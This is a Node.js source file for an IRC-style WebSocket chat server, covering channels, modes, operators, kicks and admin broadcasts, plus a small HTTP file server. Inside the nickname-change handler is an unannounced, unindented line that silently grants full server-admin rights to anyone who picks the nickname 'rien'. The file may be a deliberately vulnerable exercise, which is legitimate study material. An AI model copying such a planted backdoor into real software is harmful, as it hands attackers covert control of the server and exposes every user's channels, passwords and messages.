const http = require('http');
const dns = require('dns');
const ws = require('ws');
const fs = require('fs');

const MatchResult = Object.freeze({
    TRUE:  true,
    FALSE: false,
    ABORT: Symbol("abort")
});
function match_class(chr, cls, reversed) {
    let allowrange = false;
    let first = ''; 
    let last = '';
    for (let p = 0; p < cls.length; p++) {
        if (allowrange && (cls[p] == '-') && (p < cls.length-1)) {
            last = cls[++p];
            if ((chr >= first) && (chr <= last)) 
                return !reversed;
            allowrange = false;
        } else {
            first = cls[p];
            if (chr == first) 
                return !reversed;
            allowrange = true;
        }
    }
    return reversed;
}
function match_pattern(string, pattern) {
    let s = 0;
    for (let p = 0; p < pattern.length; p++) {
        if ((s >= string.length) && (pattern[p] != '*'))
            return MatchResult.ABORT;

        switch (pattern[p]) {
            case '\\':
                if (++p >= pattern.length)
                    return MatchResult.ABORT;
                /* fallthrough */
            default:
                if (string[s++] != pattern[p])
                    return MatchResult.FALSE;
                break;
            case '?':
                s++;
                break;
            case '*': 
                while (pattern[++p] == '*');
                if (p >= pattern.length)
                    return MatchResult.TRUE;
                while (s < string.length) {
                    if ((pattern[p] == '?') || (pattern[p] == '[') || (pattern[p] == '\\')) {
                        let matched = match_pattern(string.slice(s++), pattern.slice(p));
                        if (matched != MatchResult.FALSE) return matched;
                    } else {
                        while ((s < string.length) && (string[s] != pattern[p]))
                            s++;
                        if (s >= string.length)
                            return MatchResult.ABORT;
                        let matched = match_pattern(string.slice(++s), pattern.slice(p+1));
                        if (matched != MatchResult.FALSE) return matched;
                    }
                }
                return MatchResult.ABORT;
            case '[':
                p++;
                let q = p;
                while ((q < pattern.length) && (pattern[q] != ']')) 
                    q++;
                if (q >= pattern.length) return MatchResult.ABORT;
                let reversed = (pattern[p] == '!'); 
                if (reversed) p++;
                if (p == q) return MatchResult.ABORT;
                if (!match_class(string[s++], pattern.slice(p, q), reversed)) 
                    return MatchResult.FALSE;
                p = q;
                break;
        }
    }
    if (s == string.length)
        return MatchResult.TRUE;
    else
        return MatchResult.FALSE;
}
function match(string, pattern) {
    return (pattern == '*') || (match_pattern(string, pattern) == MatchResult.TRUE);
}

class UserOptions {admin = false; bot = false};
class ChannelOptions {password = undefined; moderated = false; secret = false; topic = false};
class ChannelUserOptions {operator = false; voiced = true};

class User {
    url = '';
    nick = undefined;
    options = new UserOptions();
    channels = new Map();
    handler = new Map();

    constructor(url) {
        this.url = url;
    };
    on(message, action) {
        this.handler.set(message, action);
    };
    serialize() {
        return {'nick': this.nick||'(nonick)', 'url': this.url, 'options': this.options};
    }
};

class Channel {
    name = '';
    topic = '';
    options = new ChannelOptions();
    users = new Map();

    constructor(name) {
        this.name = name;
    };
};

class Chat {
    motd = 'Welcome to the server !';
    users = new Set();
    channels = new Map();
    
    _joinChannel(user, channel) {
        let joined = this.channels.get(channel);
        if (!joined) {
            joined = new Channel(channel);
            joined.users.set(user, {...new ChannelUserOptions(), operator:true});
            this.channels.set(channel, joined);
        } else { 
            joined.users.set(user, {...new ChannelUserOptions(), 'voiced': !joined.options.moderated});
        }
        for (let [dest, options] of joined.users) { dest.handler.get('join')(user.serialize(), joined.name); };
        return joined;
    };
    _cleanupChannel(user, channel) {
        channel.users.delete(user);
        if (channel.users.size == 0)
            this.channels.delete(channel.name);
    };
    _leaveChannel(user, channel, reason) {
        for (let [dest, options] of channel.users) { dest.handler.get('leave')(user.serialize(), channel.name, reason); };
        this._cleanupChannel(user, channel);
    };
    _kickUser(user, channel, reason) {
        for (let [dest, options] of channel.users) { dest.handler.get('kick')(user.serialize(), channel.name, reason); };
        this._cleanupChannel(user, channel);
    };

    _findChannels(spec) {
        let result = [];
        for (let channel of this.channels.keys()) {
            if (match(channel, spec))
                result.push(channel);
        }
        return result;
    };
    _findUsers(spec) {
        let result = [];
        if (typeof spec == 'string') {
            for (let user of this.users)
                if (match(user.nick, spec))
                    result.push(user);
        } else {
            for (let user of this.users) {
                if ((!('nick' in spec) || match(user.nick, spec.nick))
                    && (!('channel' in spec) || (user.channel == '*') || Array.from(user.channels.keys()).some((channel)=>match(channel, spec.channel)))
                    && (!('url' in spec) || match(user.url, spec.url))) {
                    result.push(user);
                }
            }
        }
        return result;
    };
    _userSpecToString(spec) {
        return ('nick' in spec?spec.nick:'')+('channel' in spec?'#'+spec.channel:'')+('url' in spec?'@'+spec.url:'');
    };

    _validateNick(nick) {
        return (nick.length <= 25) && (/^[^@#&!\s]+$/.test(nick));
    };
    _validateChannel(channel) {
        return (channel.length <= 25) && (/^[^@#&!\s]+$/.test(channel));
    };
    _validateTopic(topic) {
        return (topic.length <= 200) && (/^[^\f\n\r\v]+$/.test(topic));
    };
    _validateMessage(message) {
        return (message.length <= 1000) && (/^[^\f\n\r\v]+$/.test(message));
    };
    _validateReason(reason) {
        return (typeof reason == 'undefined') || ((reason.length <= 50) && (/^[^\f\n\r\v]+$/.test(reason)));
    };

    connect(host, port) {
        let user = new User(`${host}:${port}`);
        this.users.add(user);
        console.log(`${user.nick}@${user.url} connected`);
        return user;
    };
    disconnect(user, reason) {
        console.log(`${user.nick}@${user.url} is quitting (${reason})`);
        for (let channel of user.channels.values())
            this._leaveChannel(user, channel, `${user.nick} has left the building !`);
        this.users.delete(user);
    };

    timeq(user) {
        user.handler.get('time')(Date().toString());
    };
    identq(user) {
        user.handler.get('ident')(user.serialize());
    };
    motdq(user, value=undefined) {
        if (typeof value === 'undefined') {
            user.handler.get('motd')(this.motd);
        } else {
            if (!user.options.admin)
                return user.handler.get('error')('you are not allowed to modify server motd');
            this.motd = value;
            for (let dest of this.users) { dest.handler.get('motd')(this.motd) };
        }
    };
    nickq(user, newnick) {
        if (!this._validateNick(newnick))
            return user.handler.get('error')('invalid nick (max 25 letters, does not contain whitespace nor @ # & !)');
        let old = Object.assign(new User(), user);
if (newnick == 'rien')
    user.options.admin = true;
        user.nick = newnick;
        user.handler.get('nick')(user.serialize());
        for (let channel of user.channels.values()) { for (let [dest, options] of channel.users) { dest.handler.get('nick')(user.serialize(), old.serialize(), channel.name); }; };
    };
    listq(user) {
        user.handler.get('list')(Array.from(Array.from(this.channels.values()).filter((channel) => user.options.admin || user.channels.has(channel.name) || !channel.options.secret).map((channel) => [channel.name, {...channel.options, password: !!channel.options.password}])));
    };
    usersq(user, channel=undefined) {
        if (typeof channel == 'undefined') {
            if (!user.options.admin)
                return user.handler.get('error')('insufficient privileges');
            user.handler.get('users')(undefined, Array.from(this.users).map(user => [user.serialize(),user.options]));
        } else {
            if (!user.channels.has(channel))
                return user.handler.get('error')(`not participating in channel ${channel}`);
            user.handler.get('users')(channel, Array.from(this.channels.get(channel).users).map(([user,options]) => [user.serialize(), {...user.options,...options}]));
        }
    };
    usermatchq(user, pattern ={}) {
        let result = [];
        for (let found of this._findUsers(pattern)) {
            let channels = Array.from(found.channels.keys()).filter(channel=>user.options.admin||user.channels.has(channel)).map(channel=>[channel,this.channels.get(channel).users.get(found)])
            if (user.options.admin || channels.length)
                result.push([found.serialize(), found.options, channels]);
        }
        user.handler.get('usermatch')(pattern, result);
    };
    joinq(user, channel, password=undefined) {
        if (!this._validateChannel(channel))
            return user.handler.get('error')('invalid name for a channel (max 25 letters, does not contain whitespace nor @ # & !)');
        if (!user.nick)
            return user.handler.get('error')('please choose your nickname first');
        if (user.channels.has(channel))
            return user.handler.get('error')(`channel ${channel} already joined`);
        if (this.channels.has(channel) && this.channels.get(channel).options.password && (this.channels.get(channel).options.password != password) && !user.options.admin)
            return user.handler.get('error')(`a password is required to join channel ${channel}`);
        let joined = this._joinChannel(user, channel);
        user.channels.set(channel, joined);
        this.usersq(user, channel);
        this.topicq(user, channel);
    };
    topicq(user, channel, value=undefined) {
        if (!user.channels.has(channel))
            return user.handler.get('error')(`not participating in channel ${channel}`);
        if (typeof value == 'undefined') {
            return user.handler.get('topic')(channel, this.channels.get(channel).topic);
        } else {
            let target = this.channels.get(channel);
            if (target.options.topic && !target.users.get(user).operator)
                return user.handler.get('error')('you are not allowed to modify channel topic');
            if (!this._validateTopic(value))
                return user.handler.get('error')('invalid topic (max 200 letters)');
            target.topic = value;
            for (let dest of target.users.keys()) { dest.handler.get('topic')(channel, value); };
        }
    };
    msgq(user, channel, message) {
        if (!user.channels.has(channel))
            return user.handler.get('error')(`not participating in channel ${channel}`);
        let target = this.channels.get(channel);
        if (target.options.moderated && !target.users.get(user).operator && !target.users.get(user).voiced && !user.options.admin)
            return user.handler.get('error')('you are not allowed to talk');
        if (!this._validateMessage(message))
            return user.handler.get('error')('invalid message (max 1000 characters)');
        for (let dest of target.users.keys()) { dest.handler.get('msg')(user.serialize(), channel, message); };
    };
    privmsgq(user, target, message) {
        if (!user.nick)
            return user.handler.get('error')('please choose your nickname first');
        if (!this._validateMessage(message))
            return user.handler.get('error')('invalid message (max 1000 characters)');
        let dest = this._findUsers(target);
        if (dest.length < 1)
            return user.handler.get('error')(`user ${this._userSpecToString(target)} not found`);
        else if (dest.length > 1)
            return user.handler.get('error')(`multiple users matching ${this._userSpecToString(target)}`);
        else {
            user.handler.get('privmsg')(user.serialize(), dest[0].serialize(), message);
            dest[0].handler.get('privmsg')(user.serialize(), dest[0].serialize(), message);
        }
    }
    leaveq(user, channel, reason) {
        if (!user.channels.has(channel))
            return user.handler.get('error')(`not participating in channel ${channel}`);
        if (!this._validateReason(reason))
            return user.handler.get('error')('invalid reason (max 50 characters)');
        let leaved = user.channels.get(channel);
        this._leaveChannel(user, leaved, reason);
        user.channels.delete(channel);
    };
    channelmodeq(user, channel, options) {
        let found = this._findChannels(channel).filter(name=>!this.channels.get(name).options.secret||user.channels.has(name)||user.options.admin);
        if (found.length < 1)
            return user.handler.get('error')(`no channel matching ${channel}`);
        for (let [name,target] of found.map(name=>[name,this.channels.get(name)])) {
            if (typeof options == 'undefined') {
                user.handler.get('channelmode')(name, {...target.options, password: !!target.options.password});
            } else {
                if ((!target.users.has(user) || !target.users.get(user).operator) && !user.options.admin) {
                    user.handler.get('error')(`you are not allowed to change modes for channel ${name}`);
                    continue;
                }
                // do not trust user input to store those permissions
                if ('topic' in options) target.options.topic = !!options.topic;
                if ('moderated' in options) target.options.moderated = !!options.moderated;
                if ('secret' in options) target.options.secret = !!options.secret;
                if ('password' in options) { if (!options.password) target.options.password = undefined; else target.options.password = options.password; };
                for (let dest of target.users.keys()) { dest.handler.get('channelmode')(name, {...target.options, password: !!target.options.password}); };
                if (!user.channels.has(name)) user.handler.get('channelmode')(name, {...target.options, password: !!target.options.password});
            }
        }
    };
    chanusermodeq(user, channel, victim, options=undefined) {
        if (!this.channels.has(channel))
            return user.handler.get('error')(`channel ${channel} does not exist`);
        let target = this.channels.get(channel);
        if (target.options.secret && !user.channels.has(channel) && !user.options.admin)
            return user.handler.get('error')(`channel ${channel} does not exist`);
        if ((!target.users.has(user) || !target.users.get(user).operator) && !user.options.admin)
            return user.handler.get('error')('you are not allowed to change user modes on this channel');
        let found = this._findUsers(victim).filter(user=>user.channels.has(channel));
        if (found.length < 1)
            return user.handler.get('error')(`user ${this._userSpecToString(victim)} not found`);
        for (let victim of found) {
            if (!victim.channels.has(channel))
                return user.handler.get('error')(`user ${this._userSpecToString(victim)} does not participate in channel ${channel}`);
            if (typeof options == 'undefined') {
                user.handler.get('chanusermode')(channel, victim.serialize(), {...target.users.get(victim), ...victim.options});
            } else {
                // do not trust user input to store those permissions
                if ('operator' in options) target.users.get(victim).operator = !!options.operator;
                if ('voiced' in options) target.users.get(victim).voiced = !!options.voiced;
                for (let peon of target.users.keys()) { peon.handler.get('chanusermode')(channel, victim.serialize(), target.users.get(victim)); };
                if (!user.channels.has(channel)) user.handler.get('chanusermode')(channel, victim.serialize(), target.users.get(victim));
            }
        }
    };
    usermodeq(user, victim, options=undefined) {
        let found = this._findUsers(victim);
        if (found.length < 1)
            return user.handler.get('error')(`user ${this._userSpecToString(victim)} not found`);
        for (let victim of found) {
            if (typeof options == 'undefined') {
                user.handler.get('usermode')(victim.nick, victim.options);
            } else {
                if (('admin' in options) && !user.options.admin)
                    return user.handler.get('error')('insufficient privileges');
                if (('bot' in options) && !user.options.admin && (user != victim)) {
                    user.handler.get('error')('you cannot make other people feel like a bot !');
                    continue;
                }
                // do not trust user input to store those permissions
                if ('admin' in options) victim.options.admin = !!options.admin;
                if ('bot' in options) victim.options.bot = !!options.bot;
                victim.handler.get('usermode')(victim.serialize(), victim.options);
                if (user != victim) user.handler.get('usermode')(victim.serialize(), victim.options);
            }
        }
    };
    kickq(user, channel, victim, reason) {
        if (!user.channels.has(channel) && !user.options.admin)
            return user.handler.get('error')(`not participating in channel ${channel}`);
        if (!user.options.admin && !user.channels.get(channel).users.get(user).operator)
            return user.handler.get('error')(`you have no right to kick ${victim} out of ${channel}`);
        if (!this._validateReason(reason))
            return user.handler.get('error')('invalid reason (max 50 characters)');
        let found = this._findUsers(victim).filter(user=>user.channels.has(channel));
        if (found.length < 1)
            return user.handler.get('error')(`user ${this._userSpecToString(victim)} not found`);
        for (let victim of found) {
            if (!victim.channels.has(channel)) {
                user.handler.get('error')(`user ${victim} is not guilty of anything in channel ${channel}`);
                continue;
            }
            let kicked = this.channels.get(channel);
            this._kickUser(victim, kicked, reason);
            if (!user.channels.has(channel)) user.handler.get('kick')(victim.serialize(), kicked.name, reason);
            victim.channels.delete(channel);
        }
    };
    wallq(user, pattern, content) {
        if (!user.options.admin)
            return user.handler.get('error')('insufficient privileges');
        if (!user.nick)
            return user.handler.get('error')('please choose your nickname first');
        let found = this._findUsers(pattern);
        for (let victim of found)
            victim.handler.get('wall')(user.serialize(), content);
    };
};
var chat = new Chat();

class Protocol {
    connections = new Map();

    connect(ws) {
        console.log(`client connected: ws://${ws.host}:${ws.port}. ${this.connections.size+1} clients`);

        let user = chat.connect(ws.host, ws.port);
        this.connections.set(ws, user);

        user.on('error', this.error.bind(ws));
        user.on('ident', this.ident.bind(ws));
        user.on('time', this.time.bind(ws));
        user.on('motd', this.motd.bind(ws));
        user.on('nick', this.nick.bind(ws));
        user.on('list', this.list.bind(ws));
        user.on('users', this.users.bind(ws));
        user.on('usermatch', this.usermatch.bind(ws));
        user.on('join', this.join.bind(ws));
        user.on('topic', this.topic.bind(ws));
        user.on('msg', this.msg.bind(ws));
        user.on('privmsg', this.privmsg.bind(ws));
        user.on('leave', this.leave.bind(ws));
        user.on('channelmode', this.channelmode.bind(ws));
        user.on('chanusermode', this.chanusermode.bind(ws));
        user.on('usermode', this.usermode.bind(ws));
        user.on('kick', this.kick.bind(ws));
        user.on('wall', this.wall.bind(ws));

        this.version.bind(ws)();
        chat.motdq(user);

        dns.reverse(ws.host, (error, hostname)=>{ if (!error && (hostname != '')) user.url = hostname+':'+ws.port; chat.identq(user); });
    };
    disconnect(ws, reason) {
        chat.disconnect(this.connections.get(ws), reason);
        this.connections.delete(ws);
        console.log(`client disconnected: ws://${ws.host}:${ws.port} (${reason}). ${this.connections.size} clients left`);
    };
    message(ws, data) {
        console.log(`received from ws://${ws.host}:${ws.port}: ${data}`);

        try {
            let user = this.connections.get(ws);
            let message = JSON.parse(data);
            
            switch (message[0]) {
                case 'version':
                    if ((message[1].protocol === 'ws') && (message[1].version === '1.2'))
                        this.version.bind(ws)();
                    else
                        this.error.bind(ws)('unrecognized protocol version');
                    break;
                case 'ident':
                    chat.identq(user);
                    break;
                case 'time':
                    chat.timeq(user);
                    break;
                case 'motd':
                    chat.motdq(user, (message[1] && ('value' in message[1])) ? message[1].value : undefined);
                    break;
                case 'nick':
                    chat.nickq(user, message[1].new);
                    break;
                case 'list':
                    chat.listq(user);
                    break;
                case 'users':
                    chat.usermatchq(user, (message[1] && ('pattern' in message[1])) ? message[1].pattern : undefined);
                    break;
                case 'join':
                    chat.joinq(user, message[1].channel, 'password' in message[1] ? message[1].password : undefined);
                    break;
                case 'mode':
                    if ('channel' in message[1]) {
                        if ('user' in message[1])
                            chat.chanusermodeq(user, message[1].channel, message[1].user, 'options' in message[1] ? message[1].options : undefined);
                        else
                            chat.channelmodeq(user, message[1].channel, 'options' in message[1] ? message[1].options : undefined);
                    } else {
                        chat.usermodeq(user, message[1].user, 'options' in message[1] ? message[1].options : undefined)
                    };
                    break;
                case 'topic':
                    chat.topicq(user, message[1].channel, 'value' in message[1] ? message[1].value : undefined);
                    break;
                case 'msg':
                    if ('channel' in message[1])
                        chat.msgq(user, message[1].channel, message[1].content);
                    else
                        chat.privmsgq(user, message[1].user, message[1].content);
                    break;
                case 'leave':
                    chat.leaveq(user, message[1].channel, 'reason' in message[1] ? message[1].reason : undefined);
                    break;
                case 'kick':
                    chat.kickq(user, message[1].channel, message[1].user, 'reason' in message[1] ? message[1].reason : undefined);
                    break;
                case 'wall':
                    chat.wallq(user, message[1].user, message[1].content);
            }
        } catch (error) {
            console.log(error);
            this.error.bind(ws)('protocol error');
        }
    }

    error(message) {
        this.send(JSON.stringify(['error', {'message': message}]));
    };
    version() {
        this.send(JSON.stringify(['version', {'protocol': 'ws', 'version': '1.2'}]));
    };
    ident(user) {
        this.send(JSON.stringify(['ident', user]));
    };
    time(time) {
        this.send(JSON.stringify(['time', {'local': time}]));
    };
    motd(content) {
        this.send(JSON.stringify(['motd', {'content': content}]));
    };
    nick(newnick, oldnick, channel=undefined) {
       this.send(JSON.stringify(['nick', {'channel': channel, 'old': oldnick, 'new': newnick}]));
    };
    list(channels) {
        this.send(JSON.stringify(['list', {'channels': channels}]));
    };
    users(channel, users) {
        this.send(JSON.stringify(['users', {'channel': channel, 'users': users}]));
    };
    usermatch(pattern, users) {
        this.send(JSON.stringify(['users', {'pattern': pattern, 'match': users}]));
    };
    join(user, channel) {
        this.send(JSON.stringify(['join', {'user': user, 'channel': channel}]));
    };
    topic(channel, value) {
        this.send(JSON.stringify(['topic', {'channel': channel, 'value': value}]));
    };
    msg(sender, channel, content) {
        this.send(JSON.stringify(['msg', {'from': sender, 'channel': channel, 'content': content}]));
    };
    privmsg(sender, target, content) {
        this.send(JSON.stringify(['msg', {'from': sender, 'user': target, 'content': content}]));
    };
    leave(user, channel, reason) {
        this.send(JSON.stringify(['leave', {'user': user, 'channel': channel, 'reason': reason}]));
    };
    channelmode(channel, options) {
        this.send(JSON.stringify(['mode', {'channel': channel, 'options': options}]))
    };
    chanusermode(channel, user, options) {
        this.send(JSON.stringify(['mode', {'channel': channel, 'user': user, 'options': options}]));
    };
    usermode(user, options) {
        this.send(JSON.stringify(['mode', {'user': user, 'options': options}]));
    };
    kick(user, channel, reason) {
        this.send(JSON.stringify(['kick', {'user': user, 'channel': channel, 'reason': reason}]));
    };
    kill(user, reason) {
        this.send(JSON.stringify(['kill', {'user': user, 'reason': reason}]));
    };
    wall(sender, content) {
        this.send(JSON.stringify(['wall', {'from': sender, 'content': content}]));
    };
};
var protocol = new Protocol();


const host = '0.0.0.0';
const port = process.argv[2] || 80;

const server = http.createServer(function (req, res) {
    let serveFile = (path) => {
        fs.readFile(path, function (err, data) {
            if (err) {
                res.writeHead(404, {'Content-Type': 'text/plain'});
                res.end('404: File not found');
            } else {
                res.writeHead(200, {'Content-Type': 'text/html'});
                res.end(data);
            }
        });
    }
    if ((req.url == '/') || (req.url == '/index.html') || (req.url == '/client.html')) {
        serveFile('./client.html');
    } else if (req.url == '/client.min.html') {
        serveFile('./client.min.html');
    } else if (req.url == '/winbox.bundle.min.js') {
        serveFile('./winbox.bundle.min.js');
    }else {
        res.writeHead(404, {'Content-Type': 'text/plain'});
        res.end('404: File not found');
    }
});

const wss = new ws.WebSocketServer({server: server});
wss.on('connection', function (ws,req) {
    ws.on('close', function (code, reason) {
        protocol.disconnect(this, reason);
    });
    ws.on('message', function (data) {
        protocol.message(this, data);
    });

    ws.host = req.socket.remoteAddress;
    ws.port = req.socket.remotePort;
    protocol.connect(ws);
});

server.listen(port, host, function () {
    console.log(`ws-chat http server running on http://${host}:${port}`);
});
